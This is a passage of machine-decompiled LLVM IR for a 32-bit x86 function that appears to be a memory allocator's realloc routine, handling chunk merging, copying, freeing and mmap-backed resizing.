  store i32 %v2_8053483, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8056880.205 to i32), i32* %stack_var_-60, align 4
  %v1_805348f = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056880.205 to i32))
  store i32 %v1_805348f, i32* %eax.global-to-local, align 4
  %v0_8053497 = load i32, i32* @ebx, align 4
  %tmp19 = icmp ult i32 %v0_8053497, -32
  br i1 %tmp19, label %dec_label_pc_80534ae, label %dec_label_pc_805349c

dec_label_pc_805349c:                             ; preds = %dec_label_pc_8053473
  %v0_805349c = load i32, i32* %stack_var_-60, align 4
  %v1_805349c = call i32 @function_8052779(i32 %v0_805349c)
  store i32 %v1_805349c, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_80534a3 = inttoptr i32 %v1_805349c to i32*
  store i32 12, i32* %v1_80534a3, align 4
  br label %dec_label_pc_805375a

dec_label_pc_80534ae:                             ; preds = %dec_label_pc_8053473
  %v1_80534ae = add i32 %v0_8053497, 11
  %tmp20 = icmp ult i32 %v1_80534ae, 16
  br i1 %tmp20, label %dec_label_pc_80534c5, label %dec_label_pc_80534be

dec_label_pc_80534be:                             ; preds = %dec_label_pc_80534ae
  %v1_80534be = and i32 %v1_80534ae, -8
  br label %dec_label_pc_80534c5

dec_label_pc_80534c5:                             ; preds = %dec_label_pc_80534ae, %dec_label_pc_80534be
  %stack_var_-40.0 = phi i32 [ %v1_80534be, %dec_label_pc_80534be ], [ 16, %dec_label_pc_80534ae ]
  %storemerge26 = phi i32 [ %v1_80534be, %dec_label_pc_80534be ], [ %v1_80534ae, %dec_label_pc_80534ae ]
  store i32 %storemerge26, i32* %eax.global-to-local, align 4
  %v1_80534c9 = add i32 %tmp6, -8
  store i32 %v1_80534c9, i32* @edi, align 4
  %v1_80534cc = add i32 %tmp6, -4
  %v2_80534cc = inttoptr i32 %v1_80534cc to i32*
  %v3_80534cc = load i32, i32* %v2_80534cc, align 4
  store i32 %v3_80534cc, i32* @edx, align 4
  %v1_80534d1 = and i32 %v3_80534cc, -4
  store i32 %v1_80534d1, i32* %eax.global-to-local, align 4
  %v2_80534d8 = and i32 %v3_80534cc, 2
  %v3_80534d8 = icmp eq i32 %v2_80534d8, 0
  %v1_80534db = icmp eq i1 %v3_80534d8, false
  br i1 %v1_80534db, label %dec_label_pc_8053675, label %dec_label_pc_80534e1

dec_label_pc_80534e1:                             ; preds = %dec_label_pc_80534c5
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80534d1, i32* @ebx, align 4
  %v7_80534e7 = icmp ult i32 %v1_80534d1, %stack_var_-40.0
  %v1_80534e9 = icmp eq i1 %v7_80534e7, false
  br i1 %v1_80534e9, label %dec_label_pc_8053620, label %dec_label_pc_80534ef

dec_label_pc_80534ef:                             ; preds = %dec_label_pc_80534e1
  %v2_80534ef = add i32 %v1_80534d1, %v1_80534c9
  store i32 %v2_80534ef, i32* @esi, align 4
  %v1_80534f2 = load i32, i32* @global_var_8056c4c.207, align 4
  %v12_80534f2 = icmp eq i32 %v2_80534ef, %v1_80534f2
  %v1_80534f8 = icmp eq i1 %v12_80534f2, false
  %v1_8053532 = add i32 %v2_80534ef, 4
  %v2_8053532 = inttoptr i32 %v1_8053532 to i32*
  %v3_8053532 = load i32, i32* %v2_8053532, align 4
  br i1 %v1_80534f8, label %dec_label_pc_8053532, label %dec_label_pc_80534fa

dec_label_pc_80534fa:                             ; preds = %dec_label_pc_80534ef
  %v1_80534ff = and i32 %v3_8053532, -4
  %v2_8053502 = add i32 %v1_80534ff, %v1_80534d1
  store i32 %v2_8053502, i32* %ecx.global-to-local, align 4
  %v1_8053508 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053508, i32* %eax.global-to-local, align 4
  %v7_805350b = icmp ult i32 %v2_8053502, %v1_8053508
  br i1 %v7_805350b, label %dec_label_pc_8053570, label %dec_label_pc_805350f

dec_label_pc_805350f:                             ; preds = %dec_label_pc_80534fa
  %v1_805350f = urem i32 %v3_80534cc, 2
  %v5_8053512 = or i32 %v1_805350f, %stack_var_-40.0
  store i32 %v5_8053512, i32* @edx, align 4
  store i32 %v5_8053512, i32* %v2_80534cc, align 4
  %v0_805351d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805351d = sub i32 %v0_805351d, %stack_var_-40.0
  %v0_805351f = load i32, i32* @edi, align 4
  %v2_805351f = add i32 %v0_805351f, %stack_var_-40.0
  store i32 %v2_805351f, i32* %eax.global-to-local, align 4
  %v1_8053522 = or i32 %v2_805351d, 1
  store i32 %v1_8053522, i32* %ecx.global-to-local, align 4
  store i32 %v2_805351f, i32* @global_var_8056c4c.207, align 4
  %v2_805352a = add i32 %v2_805351f, 4
  %v3_805352a = inttoptr i32 %v2_805352a to i32*
  store i32 %v1_8053522, i32* %v3_805352a, align 4
  br label %dec_label_pc_8053745

dec_label_pc_8053532:                             ; preds = %dec_label_pc_80534ef
  %v1_8053537 = and i32 %v3_8053532, -2
  store i32 %v1_8053537, i32* %eax.global-to-local, align 4
  %v3_805353a = add i32 %v1_8053532, %v1_8053537
  %v4_805353a = inttoptr i32 %v3_805353a to i8*
  %v5_805353a = load i8, i8* %v4_805353a, align 1
  %v6_805353a = urem i8 %v5_805353a, 2
  %v7_805353a = icmp eq i8 %v6_805353a, 0
  %v1_805353f = icmp eq i1 %v7_805353a, false
  br i1 %v1_805353f, label %dec_label_pc_8053570, label %dec_label_pc_8053541

dec_label_pc_8053541:                             ; preds = %dec_label_pc_8053532
  %v1_8053541 = and i32 %v3_8053532, -4
  %v2_8053548 = add i32 %v1_8053541, %v1_80534d1
  store i32 %v2_8053548, i32* @ebx, align 4
  %v10_805354a = icmp ult i32 %v2_8053548, %stack_var_-40.0
  br i1 %v10_805354a, label %dec_label_pc_8053570, label %dec_label_pc_8053550

dec_label_pc_8053550:                             ; preds = %dec_label_pc_8053541
  %v1_8053550 = add i32 %v1_80534d1, %tmp6
  %v2_8053550 = inttoptr i32 %v1_8053550 to i32*
  %v3_8053550 = load i32, i32* %v2_8053550, align 4
  store i32 %v3_8053550, i32* @edx, align 4
  %v1_8053553 = add i32 %v2_80534ef, 12
  %v2_8053553 = inttoptr i32 %v1_8053553 to i32*
  %v3_8053553 = load i32, i32* %v2_8053553, align 4
  store i32 %v3_8053553, i32* %eax.global-to-local, align 4
  %v1_8053556 = add i32 %v3_8053550, 12
  %v2_8053556 = inttoptr i32 %v1_8053556 to i32*
  %v3_8053556 = load i32, i32* %v2_8053556, align 4
  %v15_8053556 = icmp eq i32 %v3_8053556, %v2_80534ef
  %v1_8053559 = icmp eq i1 %v15_8053556, false
  br i1 %v1_8053559, label %dec_label_pc_8053560, label %dec_label_pc_805355b

dec_label_pc_805355b:                             ; preds = %dec_label_pc_8053550
  %v1_805355b = add i32 %v3_8053553, 8
  %v2_805355b = inttoptr i32 %v1_805355b to i32*
  %v3_805355b = load i32, i32* %v2_805355b, align 4
  %v15_805355b = icmp eq i32 %v3_805355b, %v2_80534ef
  br i1 %v15_805355b, label %dec_label_pc_8053565, label %dec_label_pc_8053560

dec_label_pc_8053560:                             ; preds = %dec_label_pc_805355b, %dec_label_pc_8053550
  %v0_8053560 = call i32 @function_8053b35()
  store i32 %v0_8053560, i32* %eax.global-to-local, align 4
  %v1_8053565.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053565

dec_label_pc_8053565:                             ; preds = %dec_label_pc_805355b, %dec_label_pc_8053560
  %v1_8053565 = phi i32 [ %v3_8053550, %dec_label_pc_805355b ], [ %v1_8053565.pre, %dec_label_pc_8053560 ]
  %v0_8053565 = phi i32 [ %v3_8053553, %dec_label_pc_805355b ], [ %v0_8053560, %dec_label_pc_8053560 ]
  %v2_8053565 = add i32 %v1_8053565, 12
  %v3_8053565 = inttoptr i32 %v2_8053565 to i32*
  store i32 %v0_8053565, i32* %v3_8053565, align 4
  %v0_8053568 = load i32, i32* @edx, align 4
  %v1_8053568 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053568 = add i32 %v1_8053568, 8
  %v3_8053568 = inttoptr i32 %v2_8053568 to i32*
  store i32 %v0_8053568, i32* %v3_8053568, align 4
  %v0_8053620.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053620

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053541, %dec_label_pc_8053532, %dec_label_pc_80534fa
  %v1_8053577 = add i32 %stack_var_-40.0, -7
  store i32 %v1_8053577, i32* %eax.global-to-local, align 4
  store i32 %v1_8053577, i32* %stack_var_-60, align 4
  %v1_805357b = call i32 @function_8052bd4(i32 %v1_8053577)
  store i32 %v1_805357b, i32* %eax.global-to-local, align 4
  store i32 %v1_805357b, i32* @edx, align 4
  %v1_8053585 = icmp eq i32 %v1_805357b, 0
  br i1 %v1_8053585, label %dec_label_pc_8053741, label %dec_label_pc_805358d

dec_label_pc_805358d:                             ; preds = %dec_label_pc_8053570
  %v1_805358d = add i32 %v1_805357b, -8
  store i32 %v1_805358d, i32* %ebx.global-to-local, align 4
  %v1_8053590 = load i32, i32* @esi, align 4
  %v12_8053590 = icmp eq i32 %v1_805358d, %v1_8053590
  %v1_8053592 = add i32 %v1_805357b, -4
  %v2_8053592 = inttoptr i32 %v1_8053592 to i32*
  %v3_8053592 = load i32, i32* %v2_8053592, align 4
  store i32 %v3_8053592, i32* %eax.global-to-local, align 4
  %v1_8053595 = icmp eq i1 %v12_8053590, false
  br i1 %v1_8053595, label %dec_label_pc_80535a3, label %dec_label_pc_8053597

dec_label_pc_8053597:                             ; preds = %dec_label_pc_805358d
  %v1_8053597 = and i32 %v3_8053592, -4
  store i32 %v1_8053597, i32* %eax.global-to-local, align 4
  store i32 %v1_80534d1, i32* @edx, align 4
  %v2_805359e = add i32 %v1_8053597, %v1_80534d1
  store i32 %v2_805359e, i32* @ebx, align 4
  br label %dec_label_pc_8053620

dec_label_pc_80535a3:                             ; preds = %dec_label_pc_805358d
  %v1_80535a7 = add i32 %v1_80534d1, -4
  store i32 %v1_80535a7, i32* %eax.global-to-local, align 4
  %v2_80535ac = udiv i32 %v1_80535a7, 4
  store i32 %v2_80535ac, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80535a7, 37
  br i1 %tmp, label %dec_label_pc_80535c5, label %dec_label_pc_80535b4

dec_label_pc_80535b4:                             ; preds = %dec_label_pc_80535a3
  store i32 %v1_805357b, i32* %stack_var_-60, align 4
  %v3_80535bb = inttoptr i32 %v1_805357b to i16*
  %v4_80535bb = call i32 @function_80549c2(i16* %v3_80535bb, i32 %tmp6, i32 %v1_80535a7)
  store i32 %v4_80535bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805360c

dec_label_pc_80535c5:                             ; preds = %dec_label_pc_80535a3
  store i32 %tmp6, i32* @esi, align 4
  %v1_80535cc = inttoptr i32 %tmp6 to i32*
  %v2_80535cc = load i32, i32* %v1_80535cc, align 4
  store i32 %v2_80535cc, i32* %eax.global-to-local, align 4
  %v2_80535ce = inttoptr i32 %v1_805357b to i32*
  store i32 %v2_80535cc, i32* %v2_80535ce, align 4
  %v0_80535d0 = load i32, i32* @esi, align 4
  %v1_80535d0 = add i32 %v0_80535d0, 4
  %v2_80535d0 = inttoptr i32 %v1_80535d0 to i32*
  %v3_80535d0 = load i32, i32* %v2_80535d0, align 4
  store i32 %v3_80535d0, i32* %eax.global-to-local, align 4
  %v1_80535d3 = load i32, i32* @edx, align 4
  %v2_80535d3 = add i32 %v1_80535d3, 4
  %v3_80535d3 = inttoptr i32 %v2_80535d3 to i32*
  store i32 %v3_80535d0, i32* %v3_80535d3, align 4
  %v0_80535d6 = load i32, i32* @esi, align 4
  %v1_80535d6 = add i32 %v0_80535d6, 8
  %v2_80535d6 = inttoptr i32 %v1_80535d6 to i32*
  %v3_80535d6 = load i32, i32* %v2_80535d6, align 4
  store i32 %v3_80535d6, i32* %eax.global-to-local, align 4
  %v1_80535d9 = load i32, i32* @edx, align 4
  %v2_80535d9 = add i32 %v1_80535d9, 8
  %v3_80535d9 = inttoptr i32 %v2_80535d9 to i32*
  store i32 %v3_80535d6, i32* %v3_80535d9, align 4
  %tmp27 = icmp ult i32 %v1_80535a7, 17
  br i1 %tmp27, label %dec_label_pc_805360c, label %dec_label_pc_80535de

dec_label_pc_80535de:                             ; preds = %dec_label_pc_80535c5
  %v0_80535de = load i32, i32* @esi, align 4
  %v1_80535de = add i32 %v0_80535de, 12
  %v2_80535de = inttoptr i32 %v1_80535de to i32*
  %v3_80535de = load i32, i32* %v2_80535de, align 4
  store i32 %v3_80535de, i32* %eax.global-to-local, align 4
  %v0_80535e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535e4 = load i32, i32* @edx, align 4
  %v2_80535e4 = add i32 %v1_80535e4, 12
  %v3_80535e4 = inttoptr i32 %v2_80535e4 to i32*
  store i32 %v3_80535de, i32* %v3_80535e4, align 4
  %v0_80535e7 = load i32, i32* @esi, align 4
  %v1_80535e7 = add i32 %v0_80535e7, 16
  %v2_80535e7 = inttoptr i32 %v1_80535e7 to i32*
  %v3_80535e7 = load i32, i32* %v2_80535e7, align 4
  store i32 %v3_80535e7, i32* %eax.global-to-local, align 4
  %v1_80535ea = load i32, i32* @edx, align 4
  %v2_80535ea = add i32 %v1_80535ea, 16
  %v3_80535ea = inttoptr i32 %v2_80535ea to i32*
  store i32 %v3_80535e7, i32* %v3_80535ea, align 4
  %tmp21 = icmp ult i32 %v0_80535e1, 7
  br i1 %tmp21, label %dec_label_pc_805360c, label %dec_label_pc_80535ef

dec_label_pc_80535ef:                             ; preds = %dec_label_pc_80535de
  %v0_80535ef = load i32, i32* @esi, align 4
  %v1_80535ef = add i32 %v0_80535ef, 20
  %v2_80535ef = inttoptr i32 %v1_80535ef to i32*
  %v3_80535ef = load i32, i32* %v2_80535ef, align 4
  store i32 %v3_80535ef, i32* %eax.global-to-local, align 4
  %v0_80535f2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535f5 = load i32, i32* @edx, align 4
  %v2_80535f5 = add i32 %v1_80535f5, 20
  %v3_80535f5 = inttoptr i32 %v2_80535f5 to i32*
  store i32 %v3_80535ef, i32* %v3_80535f5, align 4
  %v0_80535f8 = load i32, i32* @esi, align 4
  %v1_80535f8 = add i32 %v0_80535f8, 24
  %v2_80535f8 = inttoptr i32 %v1_80535f8 to i32*
  %v3_80535f8 = load i32, i32* %v2_80535f8, align 4
  store i32 %v3_80535f8, i32* %eax.global-to-local, align 4
  %v1_80535fb = load i32, i32* @edx, align 4
  %v2_80535fb = add i32 %v1_80535fb, 24
  %v3_80535fb = inttoptr i32 %v2_80535fb to i32*
  store i32 %v3_80535f8, i32* %v3_80535fb, align 4
  %tmp22 = icmp ult i32 %v0_80535f2, 9
  br i1 %tmp22, label %dec_label_pc_805360c, label %dec_label_pc_8053600

dec_label_pc_8053600:                             ; preds = %dec_label_pc_80535ef
  %v0_8053600 = load i32, i32* @esi, align 4
  %v1_8053600 = add i32 %v0_8053600, 28
  %v2_8053600 = inttoptr i32 %v1_8053600 to i32*
  %v3_8053600 = load i32, i32* %v2_8053600, align 4
  store i32 %v3_8053600, i32* %eax.global-to-local, align 4
  %v1_8053603 = load i32, i32* @edx, align 4
  %v2_8053603 = add i32 %v1_8053603, 28
  %v3_8053603 = inttoptr i32 %v2_8053603 to i32*
  store i32 %v3_8053600, i32* %v3_8053603, align 4
  %v0_8053606 = load i32, i32* @esi, align 4
  %v1_8053606 = add i32 %v0_8053606, 32
  %v2_8053606 = inttoptr i32 %v1_8053606 to i32*
  %v3_8053606 = load i32, i32* %v2_8053606, align 4
  store i32 %v3_8053606, i32* %eax.global-to-local, align 4
  %v1_8053609 = load i32, i32* @edx, align 4
  %v2_8053609 = add i32 %v1_8053609, 32
  %v3_8053609 = inttoptr i32 %v2_8053609 to i32*
  store i32 %v3_8053606, i32* %v3_8053609, align 4
  br label %dec_label_pc_805360c

dec_label_pc_805360c:                             ; preds = %dec_label_pc_80535ef, %dec_label_pc_80535de, %dec_label_pc_80535c5, %dec_label_pc_80535b4, %dec_label_pc_8053600
  %v0_805360f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805360f = add i32 %v0_805360f, 8
  store i32 %v1_805360f, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053616 = call i32 @function_8053999(i32 %tmp6)
  br label %dec_label_pc_805373c

dec_label_pc_8053620:                             ; preds = %dec_label_pc_80534e1, %dec_label_pc_8053597, %dec_label_pc_8053565
  %v1_8053631 = phi i32 [ %v1_80534d1, %dec_label_pc_80534e1 ], [ %v2_805359e, %dec_label_pc_8053597 ], [ %v0_8053620.pre, %dec_label_pc_8053565 ]
  %v5_8053622 = sub i32 %v1_8053631, %stack_var_-40.0
  store i32 %v5_8053622, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8053622, 16
  br i1 %tmp23, label %dec_label_pc_805362b, label %dec_label_pc_805363d

dec_label_pc_805362b:                             ; preds = %dec_label_pc_8053620
  %v0_805362b = load i32, i32* @edi, align 4
  %v1_805362b = add i32 %v0_805362b, 4
  %v2_805362b = inttoptr i32 %v1_805362b to i32*
  %v3_805362b = load i32, i32* %v2_805362b, align 4
  %v1_805362e = urem i32 %v3_805362b, 2
  %v2_8053631 = or i32 %v1_805362e, %v1_8053631
  store i32 %v2_8053631, i32* %eax.global-to-local, align 4
  store i32 %v2_8053631, i32* %v2_805362b, align 4
  %v0_8053636 = load i32, i32* @edi, align 4
  %v1_8053636 = load i32, i32* @ebx, align 4
  %v2_8053636 = add i32 %v0_8053636, 4
  %v3_8053636 = add i32 %v2_8053636, %v1_8053636
  %v4_8053636 = inttoptr i32 %v3_8053636 to i32*
  %v5_8053636 = load i32, i32* %v4_8053636, align 4
  %v6_8053636 = or i32 %v5_8053636, 1
  store i32 %v6_8053636, i32* %v4_8053636, align 4
  br label %dec_label_pc_805366d

dec_label_pc_805363d:                             ; preds = %dec_label_pc_8053620
  %v0_8053641 = load i32, i32* @edi, align 4
  %v2_8053641 = add i32 %v0_8053641, %stack_var_-40.0
  store i32 %v2_8053641, i32* %eax.global-to-local, align 4
  %v1_8053644 = add i32 %v0_8053641, 4
  %v2_8053644 = inttoptr i32 %v1_8053644 to i32*
  %v3_8053644 = load i32, i32* %v2_8053644, align 4
  %v1_8053647 = urem i32 %v3_8053644, 2
  %v5_805364a = or i32 %v1_8053647, %stack_var_-40.0
  store i32 %v5_805364a, i32* %v2_8053644, align 4
  %v0_8053654 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053656 = or i32 %v0_8053654, 1
  store i32 %v1_8053656, i32* @edx, align 4
  %v1_8053659 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053659 = add i32 %v1_8053659, 4
  %v3_8053659 = inttoptr i32 %v2_8053659 to i32*
  store i32 %v1_8053656, i32* %v3_8053659, align 4
  %v0_805365c = load i32, i32* %eax.global-to-local, align 4
  %v1_805365c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805365c = add i32 %v0_805365c, 4
  %v3_805365c = add i32 %v2_805365c, %v1_805365c
  %v4_805365c = inttoptr i32 %v3_805365c to i32*
  %v5_805365c = load i32, i32* %v4_805365c, align 4
  %v6_805365c = or i32 %v5_805365c, 1
  store i32 %v6_805365c, i32* %v4_805365c, align 4
  %v0_8053661 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053661 = add i32 %v0_8053661, 8
  store i32 %v1_8053661, i32* %eax.global-to-local, align 4
  store i32 %v1_8053661, i32* %stack_var_-60, align 4
  %v1_8053665 = call i32 @function_8053999(i32 %v1_8053661)
  store i32 %v1_8053665, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805366d

dec_label_pc_805366d:                             ; preds = %dec_label_pc_805362b, %dec_label_pc_805363d
  %v0_805366d = load i32, i32* @edi, align 4
  %v1_805366d = add i32 %v0_805366d, 8
  store i32 %v1_805366d, i32* @ebx, align 4
  br label %dec_label_pc_8053749

dec_label_pc_8053675:                             ; preds = %dec_label_pc_80534c5
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_8053679 = load i32, i32* @global_var_8056f7c.212, align 4
  %v1_805367e = add i32 %v0_8053679, -1
  store i32 %v1_805367e, i32* %eax.global-to-local, align 4
  %v2_8053683 = inttoptr i32 %v1_80534c9 to i32*
  %v3_8053683 = load i32, i32* %v2_8053683, align 4
  store i32 %v3_8053683, i32* @ebp, align 4
  %v1_8053686 = or i32 %stack_var_-40.0, 4
  store i32 %v1_8053686, i32* %stack_var_-44, align 4
  %v2_805368c = add i32 %v3_8053683, %v1_805367e
  store i32 %v2_805368c, i32* @edx, align 4
  %v1_805368f = sub i32 0, %v0_8053679
  store i32 %v1_805368f, i32* %eax.global-to-local, align 4
  %v2_8053691 = add i32 %v2_805368c, %v1_8053686
  %v2_8053694 = and i32 %v2_8053691, %v1_805368f
  store i32 %v2_8053694, i32* @esi, align 4
  %v2_8053698 = sub i32 %v2_8053694, %v3_8053683
  store i32 %v2_8053698, i32* @ebx, align 4
  %v15_805369a = icmp eq i32 %v1_80534d1, %v2_8053698
  br i1 %v15_805369a, label %dec_label_pc_8053745, label %dec_label_pc_80536a4

dec_label_pc_80536a4:                             ; preds = %dec_label_pc_8053675
  %v2_80536ab = sub i32 %v1_80534c9, %v3_8053683
  store i32 %v2_80536ab, i32* @edi, align 4
  %v2_80536ad = add i32 %v3_8053683, %v1_80534d1
  store i32 %v2_80536ad, i32* %eax.global-to-local, align 4
  store i32 %v2_80536ab, i32* %stack_var_-60, align 4
  %v6_80536b1 = inttoptr i32 %v2_80536ab to i32*
  %v7_80536b1 = call i32 @function_8054826(i32* %v6_80536b1, i32 %v2_80536ad, i32 %v2_8053694, i32 1, i32 %v1_8053686, i32 %v1_80534d1)
  store i32 %v7_80536b1, i32* %eax.global-to-local, align 4
  %v10_80536b9 = icmp eq i32 %v7_80536b1, -1
  br i1 %v10_80536b9, label %dec_label_pc_80536fd, label %dec_label_pc_80536be

dec_label_pc_80536be:                             ; preds = %dec_label_pc_80536a4
  %v1_80536be = load i32, i32* @ebp, align 4
  %v2_80536be = add i32 %v1_80536be, %v7_80536b1
  store i32 %v2_80536be, i32* @edx, align 4
  %v0_80536c1 = load i32, i32* @ebx, align 4
  %v1_80536c1 = or i32 %v0_80536c1, 2
  store i32 %v1_80536c1, i32* %ebx.global-to-local, align 4
  %v0_80536c4 = load i32, i32* @esi, align 4
  store i32 %v0_80536c4, i32* %eax.global-to-local, align 4
  %v2_80536c6 = add i32 %v2_80536be, 4
  %v3_80536c6 = inttoptr i32 %v2_80536c6 to i32*
  store i32 %v1_80536c1, i32* %v3_80536c6, align 4
  %v0_80536c9 = load i32, i32* %eax.global-to-local, align 4
  %v5_80536c9 = sub i32 %v0_80536c9, %v1_80534d1
  %v1_80536cd = load i32, i32* @global_var_8056f84.217, align 4
  %v2_80536cd = add i32 %v1_80536cd, %v5_80536c9
  store i32 %v2_80536cd, i32* %eax.global-to-local, align 4
  store i32 %v2_80536cd, i32* @global_var_8056f84.217, align 4
  %v1_80536d8 = load i32, i32* @global_var_8056f90.218, align 16
  %tmp24 = icmp ugt i32 %v2_80536cd, %v1_80536d8
  br i1 %tmp24, label %dec_label_pc_80536e0, label %dec_label_pc_80536e5

dec_label_pc_80536e0:                             ; preds = %dec_label_pc_80536be
  store i32 %v2_80536cd, i32* @global_var_8056f90.218, align 16
  br label %dec_label_pc_80536e5

dec_label_pc_80536e5:                             ; preds = %dec_label_pc_80536be, %dec_label_pc_80536e0
  %v1_80536e5 = load i32, i32* @global_var_8056f88.219, align 8
  %v2_80536e5 = add i32 %v1_80536e5, %v2_80536cd
  store i32 %v2_80536e5, i32* %eax.global-to-local, align 4
  %v1_80536eb = load i32, i32* @global_var_8056f94.220, align 4
  %tmp25 = icmp ugt i32 %v2_80536e5, %v1_80536eb
  br i1 %tmp25, label %dec_label_pc_80536f3, label %dec_label_pc_80536f8

dec_label_pc_80536f3:                             ; preds = %dec_label_pc_80536e5
  store i32 %v2_80536e5, i32* @global_var_8056f94.220, align 4
  br label %dec_label_pc_80536f8

dec_label_pc_80536f8:                             ; preds = %dec_label_pc_80536e5, %dec_label_pc_80536f3
  %v0_80536f8 = load i32, i32* @edx, align 4
  %v1_80536f8 = add i32 %v0_80536f8, 8
  store i32 %v1_80536f8, i32* @ebx, align 4
  br label %dec_label_pc_8053749

dec_label_pc_80536fd:                             ; preds = %dec_label_pc_80536a4
  %v2_80536fd = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_80536fd, i32* %eax.global-to-local, align 4
  %v10_8053700 = icmp ult i32 %v1_80534d1, %v2_80536fd
  %v1_8053704 = icmp eq i1 %v10_8053700, false
  br i1 %v1_8053704, label %dec_label_pc_8053745, label %dec_label_pc_8053706

dec_label_pc_8053706:                             ; preds = %dec_label_pc_80536fd
  %v1_805370d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805370d, i32* %eax.global-to-local, align 4
  store i32 %v1_805370d, i32* %stack_var_-60, align 4
  %v1_8053711 = call i32 @function_8052bd4(i32 %v1_805370d)
  store i32 %v1_8053711, i32* %eax.global-to-local, align 4
  store i32 %v1_8053711, i32* @ebx, align 4
  %v1_805371b = icmp eq i32 %v1_8053711, 0
  br i1 %v1_805371b, label %dec_label_pc_8053741, label %dec_label_pc_805371f

dec_label_pc_805371f:                             ; preds = %dec_label_pc_8053706
  %v1_8053724 = add i32 %v1_80534d1, -8
  store i32 %v1_8053724, i32* %eax.global-to-local, align 4
  store i32 %v1_8053711, i32* %stack_var_-60, align 4
  %v3_805372d = inttoptr i32 %v1_8053711 to i16*
  %v4_805372d = call i32 @function_80549c2(i16* %v3_805372d, i32 %tmp6, i32 %v1_8053724)
  store i32 %v4_805372d, i32* %eax.global-to-local, align 4
  store i32 %v1_8053711, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053737 = call i32 @function_8053999(i32 %tmp6)
  br label %dec_label_pc_805373c

dec_label_pc_805373c:                             ; preds = %dec_label_pc_805360c, %dec_label_pc_805371f
  %storemerge = phi i32 [ %v1_8053737, %dec_label_pc_805371f ], [ %v1_8053616, %dec_label_pc_805360c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053749

dec_label_pc_8053741:                             ; preds = %dec_label_pc_8053706, %dec_label_pc_8053570
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053749

dec_label_pc_8053745:                             ; preds = %dec_label_pc_80536fd, %dec_label_pc_8053675, %dec_label_pc_805350f
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8053749

dec_label_pc_8053749:                             ; preds = %dec_label_pc_8053741, %dec_label_pc_805373c, %dec_label_pc_80536f8, %dec_label_pc_805366d, %dec_label_pc_8053745
  store i32 %v2_805347e, i32* @eax, align 4
  store i32 %v2_805347e, i32* %stack_var_-60, align 4
  %v2_8053752 = call i32 @function_8054100(i32 %v2_805347e, i32 1)
  store i32 %v2_8053752, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053757

dec_label_pc_8053757:                             ; preds = %dec_label_pc_8053462, %dec_label_pc_805344e, %dec_label_pc_8053749
  br label %dec_label_pc_805375a

dec_label_pc_805375a:                             ; preds = %dec_label_pc_805349c, %dec_label_pc_8053757
  %v0_805375d = load i32, i32* @ebx, align 4
  store i32 %v0_805375d, i32* %eax.global-to-local, align 4
  store i32 %v0_805343f, i32* @ebx, align 4
  store i32 %v0_805343e, i32* @esi, align 4
  store i32 %v0_805343d, i32* @edi, align 4
  store i32 %v0_805343c, i32* @ebp, align 4
  ret i32 %v0_805375d

; uselistorder directives
  uselistorder i32 %v1_8053711, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_80536e5, { 1, 0, 2 }
  uselistorder i32 %v2_80536cd, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_80536ab, { 1, 0, 2 }
  uselistorder i32 %v1_8053686, { 1, 0, 2 }
  uselistorder i32 %v3_8053683, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053641, { 1, 0 }
  uselistorder i32 %v1_80535a7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_805357b, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_805351f, { 1, 0, 2 }
  uselistorder i32 %v3_8053532, { 0, 2, 1 }
  uselistorder i32 %v2_80534ef, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_80534d1, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_80534c9, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_80534be, { 1, 0 }
  uselistorder i32 %v1_80534ae, { 0, 2, 1 }
  uselistorder i32 %v0_8053497, { 1, 0 }
  uselistorder i32 %v2_805347e, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
